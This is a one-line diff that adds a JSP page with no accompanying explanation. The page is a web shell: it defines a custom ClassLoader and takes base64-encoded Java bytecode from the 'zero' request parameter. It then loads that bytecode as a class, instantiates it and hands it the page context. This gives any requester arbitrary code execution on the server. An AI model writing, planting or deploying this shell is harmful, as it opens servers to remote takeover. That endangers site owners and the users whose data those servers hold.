@@ -1,0 +1,1 @@
+<%!class BQMV extends ClassLoader{ BQMV(ClassLoader RZBE){ super(RZBE); }public Class g(byte []b){ return super.defineClass(b,0,b.length); }}%><% String cls=request.getParameter("zero");if(cls!=null){ new BQMV(this.getClass().getClassLoader()).g(new sun.misc.BASE64Decoder().decodeBuffer(cls)).newInstance().equals(pageContext); }%>
